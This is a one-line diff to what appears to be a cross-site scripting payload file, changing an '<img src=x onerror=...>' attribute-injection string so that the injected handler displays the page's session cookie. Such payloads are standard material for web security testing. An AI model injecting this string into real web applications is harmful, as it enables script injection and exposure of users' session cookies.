@@ -1,1 +1,1 @@
-"><img src=x onerror=prompt()>
+"><img src=x onerror=prompt(document.cookie)>
